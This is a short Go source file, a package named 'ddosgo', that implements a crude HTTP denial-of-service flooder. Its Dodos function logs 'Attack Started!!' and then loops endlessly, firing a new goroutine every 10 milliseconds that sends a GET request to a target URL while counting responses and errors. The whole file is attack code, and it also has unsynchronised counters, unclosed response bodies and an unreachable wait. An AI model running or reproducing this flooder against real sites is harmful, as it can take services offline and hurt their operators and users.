package ddosgo

import (
  "net/http"
  "log"
  "time"
  "sync"
)

var (
  Totalrequest = new(int)
  Totalresponse = new(int)
  Totalbounced = new(int)
  URL = new(string)
  Errors map[string]int
  Responses map[int]int
  rwm     sync.RWMutex
)

func setError(key string) {
	rwm.Lock()
	defer rwm.Unlock()
	Errors[key]+=1
}

func setResponse(key int)  {
  rwm.Lock()
  defer rwm.Unlock()
  Responses[key]+=1
}

func Dodos(url string)  {
  Errors = make(map[string]int)
  Responses = make(map[int]int)
  *URL = url
  var wg sync.WaitGroup
  log.Print("Attack Started!!")
  for {
    go func ()  {
      wg.Add(1)
      *Totalrequest += 1
      resp, err := http.Get(url)
      if err != nil {
        *Totalbounced += 1
        setError(string(err.Error()))
      }else{
        *Totalresponse += 1
        setResponse(resp.StatusCode)
      }
      wg.Done()
    }()
    time.Sleep(10*time.Millisecond)
  }
  wg.Wait()
}
